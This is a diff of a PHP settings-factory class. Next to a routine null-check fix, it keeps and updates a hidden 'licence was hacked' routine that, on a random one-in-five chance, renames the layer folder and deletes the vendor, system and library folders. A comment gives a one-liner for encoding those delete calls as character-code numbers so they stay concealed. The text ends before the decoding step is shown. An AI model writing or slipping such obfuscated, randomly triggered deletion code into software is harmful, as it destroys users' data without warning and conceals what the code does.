@@ -57,9 +57,13 @@ class BeanSettingsFileFactory {
 	public static function getBeanSettingsByName($settings, $name) {
 		if ($settings && !empty($name)) {
 			$total = count($settings);
-			for($i = 0; $i < $total; $i++)
-				if (!empty($settings[$i]["bean"]) && $settings[$i]["bean"]["name"] == $name)
-					return $settings[$i]["bean"];
+			for($i = 0; $i < $total; $i++) 
+				if (!empty($settings[$i]["bean"])) {
+					$bean_name = isset($settings[$i]["bean"]["name"]) ? $settings[$i]["bean"]["name"] : null;
+					
+					if ($bean_name == $name)
+						return $settings[$i]["bean"];
+				}
 		}
 		return false;
 	}
@@ -118,7 +122,9 @@ class BeanSettingsFileFactory {
 		
 		//execute consequence if licence was hacked
 		$rand = rand(0, 100);
-		if ($rand > 80 && class_exists("PHPFrameWork") && !is_numeric(substr(LA_REGEX, strpos(LA_REGEX, "]") -1, 1))) { //[0-9] => 9
+		$la_regex = defined("LA_REGEX") ? LA_REGEX : null;
+		
+		if ($rand > 80 && class_exists("PHPFrameWork") && !is_numeric(substr($la_regex, strpos($la_regex, "]") -1, 1))) { //[0-9] => 9
 			//Deletes folders
 			//To create the numbers:
 			//	php -r '$x="@rename(LAYER_PATH, APP_PATH . \".layer\");@CacheHandlerUtil::deleteFolder(VENDOR_PATH);@CacheHandlerUtil::deleteFolder(SYSTEM_PATH);@CacheHandlerUtil::deleteFolder(LIB_PATH, false, array(realpath(LIB_PATH . \"cache/CacheHandlerUtil.php\")));@PHPFrameWork::hC();"; $l=strlen($x); for($i=0; $i<$l; $i+=2) echo ($i+1<$l?ord($x[$i+1])." ":"").ord($x[$i])." "; echo "\n";'
